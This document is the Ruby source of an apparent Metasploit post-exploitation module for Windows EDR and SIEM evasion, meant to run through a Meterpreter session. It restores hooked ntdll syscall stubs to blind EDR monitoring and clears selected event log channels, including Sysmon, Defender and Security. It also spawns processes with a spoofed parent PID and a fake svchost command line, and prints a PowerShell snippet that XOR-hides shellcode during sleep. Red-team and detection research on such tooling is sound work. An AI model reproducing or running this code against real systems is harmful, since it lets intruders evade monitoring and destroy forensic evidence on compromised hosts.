##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::EdrEvasion

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Windows EDR Telemetry & SIEM Evasion',
        'Description' => %q{
          Reduces the on-target telemetry footprint of an active Meterpreter
          session across four independent axes:

          1. ntdll hook detection and restoration
             Scans ntdll.dll for EDR user-mode hooks (JMP trampolines prepended
             to syscall stubs) by comparing the live in-memory image with the
             on-disk copy read directly via Meterpreter.  When RESTORE_HOOKS is
             true, overwrites hooked stubs with the original bytes, removing the
             EDR's visibility into subsequent memory-allocation and thread-
             creation syscalls.

          2. Selective event log channel clearing
             Clears only the highest-value EDR/SIEM channels (Sysmon, PowerShell/
             Operational, WMI-Activity, Defender, Security) rather than wiping all
             logs — a full wipe is a tier-1 SOC alert in most environments.

          3. Process spawn camouflage (on-demand helper)
             When SPAWN_EXE is set, spawns the specified executable under a
             plausibility-mapped parent PID and optionally masks the visible
             command line in the process PEB.  The parent is chosen from a table
             of legitimately-observed parent→child relationships to avoid
             "suspicious parent process" detections.

          4. Sleep obfuscation snippet (PowerShell only)
             When SLEEP_OBFU_VAR is set, prints a PowerShell snippet that XOR-
             encrypts the nominated byte-array variable before a sleep and
             decrypts it on waking, keeping plaintext shellcode off the heap
             during the inactive window when periodic memory scanners fire.

          Intended for post-exploitation on engagements where EDR/SIEM
          telemetry has been confirmed and operator needs to reduce noise.
        },
        'License'     => MSF_LICENSE,
        'Author'      => ['msf'],
        'Platform'    => ['win'],
        'SessionTypes'=> ['meterpreter'],
        'Notes'       => {
          'Stability'    => [CRASH_SAFE],
          'Reliability'  => [],
          'SideEffects'  => [ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptEnum.new('ACTION', [
        true,
        'Which evasion capability to run',
        'all',
        %w[all detect_hooks restore_hooks clear_logs spawn_camouflaged sleep_snippet]
      ])
    ])

    register_advanced_options([
      # --- hook detection / restoration ---
      OptString.new('HOOK_FUNCTIONS', [
        false,
        'Comma-separated ntdll exports to inspect/restore (blank = all defaults)',
        ''
      ]),
      OptBool.new('RESTORE_HOOKS', [
        true,
        'Restore detected hooks after detection (requires writable ntdll pages)',
        true
      ]),

      # --- event log clearing ---
      OptString.new('LOG_CHANNELS', [
        false,
        'Comma-separated event log channels to clear (blank = EDR defaults)',
        ''
      ]),

      # --- process spawn camouflage ---
      OptString.new('SPAWN_EXE', [false, 'Executable to spawn with camouflage', '']),
      OptString.new('SPAWN_ARGS', [false, 'Arguments for spawned process', '']),
      OptString.new('SPAWN_MASK_CMDLINE', [
        false,
        'Fake command-line string to write into the spawned process PEB',
        'C:\\Windows\\System32\\svchost.exe -k netsvcs -p'
      ]),
      OptInt.new('SPAWN_PPID', [
        false,
        'Explicit PPID to use (0 = auto-select from plausibility map)',
        0
      ]),

      # --- sleep obfuscation snippet ---
      OptString.new('SLEEP_OBFU_VAR', [
        false,
        'PS variable name (no $) to XOR-encrypt during sleep',
        ''
      ]),
      OptInt.new('SLEEP_OBFU_SECS', [
        false,
        'Sleep duration for the generated snippet (seconds)',
        30
      ])
    ])
  end

  def run
    host = sysinfo['Computer'] rescue cmd_exec('hostname').strip
    print_status("EDR bypass running against #{host} (#{session.session_host})")

    unless has_railgun?
      fail_with(Failure::NoTarget, 'This module requires a Meterpreter session with Railgun support')
    end

    action = datastore['ACTION']

    case action
    when 'all'
      run_detect_hooks
      run_restore_hooks if datastore['RESTORE_HOOKS']
      run_clear_logs
      run_spawn_camouflaged unless datastore['SPAWN_EXE'].to_s.empty?
      run_sleep_snippet     unless datastore['SLEEP_OBFU_VAR'].to_s.empty?
    when 'detect_hooks'
      run_detect_hooks
    when 'restore_hooks'
      run_restore_hooks
    when 'clear_logs'
      run_clear_logs
    when 'spawn_camouflaged'
      run_spawn_camouflaged
    when 'sleep_snippet'
      run_sleep_snippet
    end
  end

  private

  # ---------------------------------------------------------------- #
  # Action runners
  # ---------------------------------------------------------------- #

  def run_detect_hooks
    print_status('--- ntdll hook detection ---')
    fns = hook_function_list

    begin
      results = detect_ntdll_hooks(fns)
    rescue => e
      print_error("Hook detection failed: #{e}")
      return
    end

    hooked  = results.select { |_, s| s == :hooked }
    clean   = results.select { |_, s| s == :clean }
    unknown = results.select { |_, s| s == :unknown }

    print_good("Clean:   #{clean.keys.join(', ')}")   unless clean.empty?
    print_warning("Hooked:  #{hooked.keys.join(', ')}") unless hooked.empty?
    print_status("Unknown: #{unknown.keys.join(', ')}") unless unknown.empty?

    if hooked.empty?
      print_good('No EDR hooks detected in ntdll for the inspected functions')
    else
      print_warning("#{hooked.size} hook(s) detected — run ACTION=restore_hooks to remove them")
    end
  end

  def run_restore_hooks
    print_status('--- ntdll hook restoration ---')
    fns = hook_function_list

    begin
      patched = restore_ntdll_stubs(fns)
    rescue => e
      print_error("Hook restoration failed: #{e}")
      return
    end

    if patched.empty?
      print_status('No hooks were restored (none detected or all clean)')
    else
      print_good("Restored clean stubs for: #{patched.join(', ')}")
    end
  end

  def run_clear_logs
    print_status('--- selective event log clearing ---')

    channels = if datastore['LOG_CHANNELS'].to_s.strip.empty?
                 edr_channels
               else
                 datastore['LOG_CHANNELS'].split(',').map(&:strip)
               end

    print_status("Clearing #{channels.length} channel(s): #{channels.first(3).join(', ')}#{channels.length > 3 ? '...' : ''}")

    results = clear_edr_channels(channels)

    results.each do |ch, status|
      case status
      when :cleared
        print_good("  Cleared:      #{ch}")
      when :not_present
        print_status("  Not present:  #{ch}")
      when :failed
        print_error("  Failed:       #{ch}")
      end
    end

    cleared_count = results.values.count(:cleared)
    print_good("#{cleared_count}/#{channels.length} channel(s) cleared successfully")
  end

  def run_spawn_camouflaged
    exe = datastore['SPAWN_EXE'].to_s.strip
    if exe.empty?
      print_error('SPAWN_EXE is required for this action')
      return
    end

    print_status('--- camouflaged process spawn ---')

    opts = {
      args:          datastore['SPAWN_ARGS'].to_s,
      mask_cmdline:  datastore['SPAWN_MASK_CMDLINE'].to_s,
      ppid:          datastore['SPAWN_PPID'].to_i.nonzero?,
      hidden:        true
    }
    opts.delete(:ppid) unless opts[:ppid]

    begin
      proc = spawn_camouflaged(exe, opts)
      if proc
        print_good("Spawned PID #{proc.pid} (#{::File.basename(exe)})")
        print_good("  Visible cmdline: #{opts[:mask_cmdline]}") if opts[:mask_cmdline]
      else
        print_error('Spawn failed — no process object returned')
      end
    rescue => e
      print_error("Spawn failed: #{e}")
    end
  end

  def run_sleep_snippet
    var = datastore['SLEEP_OBFU_VAR'].to_s.strip
    if var.empty?
      print_error('SLEEP_OBFU_VAR is required for this action')
      return
    end

    secs = datastore['SLEEP_OBFU_SECS'].to_i
    print_status('--- sleep obfuscation snippet ---')
    snippet = sleep_obfuscation_snippet(var, secs)
    print_line('')
    print_line('# Paste the following into your PowerShell session / payload:')
    snippet.each_line { |l| print_line(l.chomp) }
    print_line('')
    print_good('Snippet will XOR-encrypt $' + var + ' during the sleep window')
  end

  # ---------------------------------------------------------------- #
  # Helpers
  # ---------------------------------------------------------------- #

  def hook_function_list
    raw = datastore['HOOK_FUNCTIONS'].to_s.strip
    return Msf::Post::Windows::EdrEvasion::DEFAULT_HOOK_TARGETS if raw.empty?
    raw.split(',').map(&:strip).reject(&:empty?)
  end

  def has_railgun?
    session.respond_to?(:railgun)
  end
end
